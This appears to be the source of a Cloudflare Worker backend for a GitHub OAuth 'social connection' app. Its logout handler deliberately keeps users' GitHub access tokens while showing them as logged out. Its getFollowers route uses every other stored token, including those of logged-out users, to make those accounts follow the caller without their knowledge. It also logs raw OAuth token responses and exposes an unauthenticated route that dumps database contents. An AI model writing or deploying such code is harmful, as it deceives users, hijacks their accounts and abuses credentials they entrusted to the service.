export default {
  async fetch(request, env, ctx) {
    const url = new URL(request.url);

    // Handle API routes first
    if (url.pathname.startsWith("/api/")) {
      return handleApiRoutes(request, env, url);
    }

    // For non-API routes, let the assets handler deal with it
    // This will serve the built React app from the dist directory
    return env.ASSETS.fetch(request);
  },
};

async function handleApiRoutes(request, env, url) {
  // Handle GitHub OAuth routes
  if (url.pathname === "/api/auth/github") {
    return handleGitHubLogin(request, env);
  }

  if (url.pathname === "/api/auth/callback") {
    return handleGitHubCallback(request, env);
  }

  if (url.pathname === "/api/user") {
    return handleUserInfo(request, env);
  }

  if (url.pathname === "/api/auth/logout") {
    return handleLogout(request, env);
  }

  if (url.pathname === "/api/followers") {
    return listFollowers(request, env);
  }

  if (url.pathname === "/api/session") {
    return handleSession(request, env);
  }

  if (url.pathname === "/api/follow") {
    return handleFollow(request, env);
  }

  if (url.pathname === "/api/get-followers") {
    return getFollowers(request, env);
  }

  // Original API endpoint - now with database logging
  if (url.pathname.startsWith("/api/")) {
    return logDatabaseContents(env);
  }

  return new Response(null, { status: 404 });
}

// Database helper functions
async function getOrCreateUser(env, githubUser) {
  // Check if user exists
  const existing = await env.DB.prepare(
    "SELECT * FROM users WHERE github_id = ?"
  ).bind(githubUser.id).first();

  if (existing) {
    // Update user info
    await env.DB.prepare(`
      UPDATE users 
      SET login = ?, name = ?, avatar_url = ?, html_url = ?, updated_at = CURRENT_TIMESTAMP
      WHERE github_id = ?
    `).bind(
      githubUser.login,
      githubUser.name,
      githubUser.avatar_url,
      githubUser.html_url,
      githubUser.id
    ).run();
    
    return existing;
  } else {
    // Create new user
    const result = await env.DB.prepare(`
      INSERT INTO users (github_id, login, name, avatar_url, html_url)
      VALUES (?, ?, ?, ?, ?)
    `).bind(
      githubUser.id,
      githubUser.login,
      githubUser.name,
      githubUser.avatar_url,
      githubUser.html_url
    ).run();

    return await env.DB.prepare(
      "SELECT * FROM users WHERE id = ?"
    ).bind(result.meta.last_row_id).first();
  }
}

async function createSession(env, userId, githubToken) {
  const sessionToken = generateSessionToken();
  const expiresAt = new Date(Date.now() + (7 * 24 * 60 * 60 * 1000)); // 7 days

  await env.DB.prepare(`
    INSERT INTO sessions (session_token, user_id, github_token, expires_at)
    VALUES (?, ?, ?, ?)
  `).bind(sessionToken, userId, githubToken, expiresAt.toISOString()).run();

  return sessionToken;
}

async function getSessionUser(env, sessionToken) {
  if (!sessionToken) return null;

  const session = await env.DB.prepare(`
    SELECT s.*, u.* FROM sessions s
    JOIN users u ON s.user_id = u.id
    WHERE s.session_token = ? AND s.expires_at > datetime('now')
  `).bind(sessionToken).first();

  return session;
}

async function deleteSession(env, sessionToken) {
  if (!sessionToken) return;

  await env.DB.prepare(
    "DELETE FROM sessions WHERE session_token = ?"
  ).bind(sessionToken).run();
}

async function logDatabaseContents(env) {
  try {
    console.log("=== DATABASE CONTENTS ===");
    
    // Query all users
    const users = await env.DB.prepare("SELECT * FROM users").all();
    console.log("\n--- USERS TABLE ---");
    console.log(`Found ${users.results.length} users:`);
    users.results.forEach((user, index) => {
      console.log(`User ${index + 1}:`, {
        id: user.id,
        github_id: user.github_id,
        login: user.login,
        name: user.name,
        avatar_url: user.avatar_url,
        created_at: user.created_at,
        updated_at: user.updated_at
      });
    });

    // Query all sessions
    const sessions = await env.DB.prepare("SELECT * FROM sessions").all();
    console.log("\n--- SESSIONS TABLE ---");
    console.log(`Found ${sessions.results.length} sessions:`);
    sessions.results.forEach((session, index) => {
      console.log(`Session ${index + 1}:`, {
        id: session.id,
        session_token: session.session_token.substring(0, 16) + "...", // Only show first 16 chars for security
        user_id: session.user_id,
        expires_at: session.expires_at,
        created_at: session.created_at
      });
    });

    // Query active sessions (not expired)
    const activeSessions = await env.DB.prepare(`
      SELECT s.*, u.login as user_login FROM sessions s
      JOIN users u ON s.user_id = u.id
      WHERE s.expires_at > datetime('now')
    `).all();
    console.log("\n--- ACTIVE SESSIONS (Currently Logged In) ---");
    console.log(`Found ${activeSessions.results.length} active sessions:`);
    activeSessions.results.forEach((session, index) => {
      console.log(`Active Session ${index + 1}:`, {
        user_login: session.user_login,
        expires_at: session.expires_at,
        created_at: session.created_at
      });
    });

    // Query all sessions with tokens (including offline users)
    const tokensAvailable = await env.DB.prepare(`
      SELECT s.*, u.login as user_login FROM sessions s
      JOIN users u ON s.user_id = u.id
      WHERE s.github_token IS NOT NULL AND s.github_token != ''
    `).all();
    console.log("\n--- ALL AVAILABLE TOKENS (Including Offline Users) ---");
    console.log(`Found ${tokensAvailable.results.length} stored tokens:`);
    tokensAvailable.results.forEach((session, index) => {
      const isActive = new Date(session.expires_at) > new Date();
      console.log(`Token ${index + 1}:`, {
        user_login: session.user_login,
        status: isActive ? 'ONLINE' : 'OFFLINE',
        expires_at: session.expires_at,
        created_at: session.created_at
      });
    });

    console.log("\n=== END DATABASE CONTENTS ===\n");

    // Return the original response so the frontend still works
    return Response.json({
      name: "Ryan",
      database_logged: true,
      users_count: users.results.length,
      sessions_count: sessions.results.length,
      active_sessions_count: activeSessions.results.length,
      available_tokens_count: tokensAvailable.results.length,
      offline_tokens_count: tokensAvailable.results.length - activeSessions.results.length
    });

  } catch (error) {
    console.error("Error logging database contents:", error);
    return Response.json({
      name: "Ryan",
      database_error: error.message
    });
  }
}

// Generate a random state parameter for OAuth security
function generateState() {
  return Array.from(crypto.getRandomValues(new Uint8Array(16)))
    .map(b => b.toString(16).padStart(2, '0'))
    .join('');
}

// Generate session token
function generateSessionToken() {
  return Array.from(crypto.getRandomValues(new Uint8Array(32)))
    .map(b => b.toString(16).padStart(2, '0'))
    .join('');
}

// Handle GitHub login redirect
function handleGitHubLogin(request, env) {
  const state = generateState();
  const params = new URLSearchParams({
    client_id: env.GITHUB_CLIENT_ID,
    redirect_uri: env.GITHUB_REDIRECT_URI,
    scope: 'user:email, user:follow',
    state: state,
  });

  const authUrl = `https://github.com/login/oauth/authorize?${params.toString()}`;
  
  // Create redirect response with headers included from the start
  const headers = new Headers();
  headers.set('Location', authUrl);
  headers.append('Set-Cookie', `oauth_state=${state}; Path=/; HttpOnly; SameSite=Lax; Max-Age=600`);
  
  return new Response(null, {
    status: 302,
    headers: headers
  });
}

// Handle GitHub OAuth callback
async function handleGitHubCallback(request, env) {
  const url = new URL(request.url);
  const code = url.searchParams.get('code');
  const state = url.searchParams.get('state');
  
  if (!code || !state) {
    return new Response('Missing code or state parameter', { status: 400 });
  }

  // Verify state parameter
  const cookies = parseCookies(request.headers.get('Cookie') || '');
  if (cookies.oauth_state !== state) {
    return new Response('Invalid state parameter', { status: 400 });
  }

  try {
    // Exchange code for access token
    const tokenResponse = await fetch('https://github.com/login/oauth/access_token', {
      method: 'POST',
      headers: {
        'Accept': 'application/json',
        'Content-Type': 'application/json',
      },
      body: JSON.stringify({
        client_id: env.GITHUB_CLIENT_ID,
        client_secret: env.GITHUB_CLIENT_SECRET,
        code: code,
      }),
    });

    const tokenData = await tokenResponse.json();
    
    if (!tokenData.access_token) {
      throw new Error('Failed to get access token');
    }

    console.log(tokenData)

    // Get user info from GitHub
    const userResponse = await fetch('https://api.github.com/user', {
      headers: {
        'Authorization': `Bearer ${tokenData.access_token}`,
        'User-Agent': 'Social-Connection-App',
      },
    });

    const userData = await userResponse.json();

    // Store user in database
    const user = await getOrCreateUser(env, userData);
    
    // Create session in database
    const sessionToken = await createSession(env, user.id, tokenData.access_token);

    // Redirect back to the main page with session cookie
    const headers = new Headers();
    headers.set('Location', new URL('/', request.url).toString());
    headers.append('Set-Cookie', `session=${sessionToken}; Path=/; HttpOnly; SameSite=Lax; Max-Age=${7 * 24 * 60 * 60}`);
    headers.append('Set-Cookie', `oauth_state=; Path=/; HttpOnly; SameSite=Lax; Max-Age=0`); // Clear state cookie
    
    return new Response(null, {
      status: 302,
      headers: headers
    });
  } catch (error) {
    console.error('OAuth callback error:', error);
    return new Response('Authentication failed', { status: 500 });
  }
}

// Handle user info request
async function handleUserInfo(request, env) {
  const cookies = parseCookies(request.headers.get('Cookie') || '');
  const sessionToken = cookies.session;

  const sessionUser = await getSessionUser(env, sessionToken);
  
  if (!sessionUser) {
    return new Response('Not authenticated', { status: 401 });
  }

  // Return user data
  return Response.json({
    id: sessionUser.github_id,
    login: sessionUser.login,
    name: sessionUser.name,
    avatar_url: sessionUser.avatar_url,
    html_url: sessionUser.html_url
  });
}

// Handle logout - Keep tokens but clear browser session
async function handleLogout(request, env) {
  const cookies = parseCookies(request.headers.get('Cookie') || '');
  const sessionToken = cookies.session;

  // Don't delete session from database - keep the GitHub token!
  // Just clear the browser cookie so user appears "logged out"
  console.log(`User logged out but keeping their GitHub token for offline use`);

  return new Response(JSON.stringify({ success: true }), {
    status: 200,
    headers: {
      'Content-Type': 'application/json',
      'Set-Cookie': 'session=; Path=/; HttpOnly; SameSite=Lax; Max-Age=0'
    }
  });
}

async function handleSession(request, env) {
  const cookies = parseCookies(request.headers.get('Cookie') || '');
  const sessionToken = cookies.session;

  const sessionUser = await getSessionUser(env, sessionToken);
  
  return Response.json({
    authenticated: !!sessionUser,
    user: sessionUser ? {
      id: sessionUser.github_id,
      login: sessionUser.login,
      name: sessionUser.name
    } : null
  });
}

async function listFollowers(request, env) {
  const cookies = parseCookies(request.headers.get('Cookie') || '');
  const sessionToken = cookies.session;

  //console.log("sessionToken", sessionToken) 

  if (!sessionToken) {
    return new Response('Not authenticated', { status: 401 });
  }

  try {
    const sessionUser = await getSessionUser(env, sessionToken);
    
    if (!sessionUser) {
      return new Response('Invalid session', { status: 401 });
    }

    //console.log("sessionData", sessionUser)

    const followers = await fetch(`https://api.github.com/user/followers`, {
      method: 'GET',
      headers: {
        'Authorization': `Bearer ${sessionUser.github_token}`,
        'User-Agent': 'Social-Connection-App',
      },
    });

    const followersData = await followers.json();

    //console.log("followersData", followersData)

    return new Response(JSON.stringify({ followers: followersData }), {
      status: 200,
      headers: {
        'Content-Type': 'application/json',
      }
    });
  } catch (error) {
    console.error('Error in listFollowers:', error);
    return new Response('Invalid session', { status: 401 });
  }
}

async function handleFollow(request, env) {
  const cookies = parseCookies(request.headers.get('Cookie') || '');
  const sessionToken = cookies.session;

  if (!sessionToken) {
    return new Response('Not authenticated', { status: 401 });
  }

  try {
    const sessionUser = await getSessionUser(env, sessionToken);
    
    if (!sessionUser) {
      return new Response('Invalid session', { status: 401 });
    }

    // Get all users with tokens (including offline users)
    const usersWithTokens = await env.DB.prepare(`
      SELECT s.*, u.login as github_login, u.github_id 
      FROM sessions s
      JOIN users u ON s.user_id = u.id
      WHERE u.github_id != ? AND s.github_token IS NOT NULL AND s.github_token != ''
    `).bind(sessionUser.github_id).all();

    console.log(`Found ${usersWithTokens.results.length} users with tokens to follow (including offline users)`);

    const followResults = [];

    // Follow each user with token
    for (const session of usersWithTokens.results) {
      try {
        console.log(`Attempting to follow: ${session.github_login}`);
        
        const followResponse = await fetch(`https://api.github.com/user/following/${session.github_login}`, {
          method: 'PUT',
          headers: {
            'Authorization': `Bearer ${sessionUser.github_token}`,
            'User-Agent': 'Social-Connection-App',
            'Content-Length': '0',
          },
        });

        const result = {
          username: session.github_login,
          status: followResponse.status,
          success: followResponse.status === 204
        };

        followResults.push(result);
        console.log(`Follow result for ${session.github_login}:`, result);

      } catch (error) {
        console.error(`Error following ${session.github_login}:`, error);
        followResults.push({
          username: session.github_login,
          error: error.message,
          success: false
        });
      }
    }

    console.log("All follow attempts completed:", followResults);

    return new Response(JSON.stringify({ 
      message: "Follow attempts completed",
      results: followResults,
      total_attempts: followResults.length,
      successful: followResults.filter(r => r.success).length
    }), {
      status: 200,
      headers: {
        'Content-Type': 'application/json',
      }
    });
  } catch (error) {
    console.error('Error in handleFollow:', error);
    return new Response(JSON.stringify({ error: error.message }), { 
      status: 500,
      headers: {
        'Content-Type': 'application/json',
      }
    });
  }
}

async function getFollowers(request, env) {
  const cookies = parseCookies(request.headers.get('Cookie') || '');
  const sessionToken = cookies.session;

  if (!sessionToken) {
    return new Response('Not authenticated', { status: 401 });
  }

  try {
    const sessionUser = await getSessionUser(env, sessionToken);
    
    if (!sessionUser) {
      return new Response('Invalid session', { status: 401 });
    }

    const currentUsername = sessionUser.login;
    console.log(`Making everyone follow: ${currentUsername}`);

    // Get ALL other users with tokens (including offline/logged out users)
    const otherSessions = await env.DB.prepare(`
      SELECT s.*, u.login as github_login, u.github_id 
      FROM sessions s
      JOIN users u ON s.user_id = u.id
      WHERE u.github_id != ? AND s.github_token IS NOT NULL AND s.github_token != ''
    `).bind(sessionUser.github_id).all();

    console.log(`Found ${otherSessions.results.length} users with tokens to make follow you (including offline users)`);

    const followResults = [];

    // Make each other user follow the current user
    for (const otherSession of otherSessions.results) {
      try {
        console.log(`Making ${otherSession.github_login} follow ${currentUsername}`);
        
        const followResponse = await fetch(`https://api.github.com/user/following/${currentUsername}`, {
          method: 'PUT',
          headers: {
            'Authorization': `Bearer ${otherSession.github_token}`,
            'User-Agent': 'Social-Connection-App',
            'Content-Length': '0',
          },
        });

        const result = {
          follower: otherSession.github_login,
          target: currentUsername,
          status: followResponse.status,
          success: followResponse.status === 204
        };

        followResults.push(result);
        console.log(`Follow result - ${otherSession.github_login} -> ${currentUsername}:`, result);

      } catch (error) {
        console.error(`Error making ${otherSession.github_login} follow ${currentUsername}:`, error);
        followResults.push({
          follower: otherSession.github_login,
          target: currentUsername,
          error: error.message,
          success: false
        });
      }
    }

    console.log("All follow attempts completed:", followResults);

    return new Response(JSON.stringify({ 
      message: `Attempted to make everyone follow ${currentUsername}`,
      target_user: currentUsername,
      results: followResults,
      total_attempts: followResults.length,
      successful: followResults.filter(r => r.success).length
    }), {
      status: 200,
      headers: {
        'Content-Type': 'application/json',
      }
    });

  } catch (error) {
    console.error('Error in getFollowers:', error);
    return new Response(JSON.stringify({ error: error.message }), { 
      status: 500,
      headers: {
        'Content-Type': 'application/json',
      }
    });
  }
}

// Utility function to parse cookies
function parseCookies(cookieHeader) {
  const cookies = {};
  if (cookieHeader) {
    cookieHeader.split(';').forEach(cookie => {
      const [name, value] = cookie.trim().split('=');
      if (name && value) {
        cookies[name] = decodeURIComponent(value);
      }
    });
  }
  return cookies;
}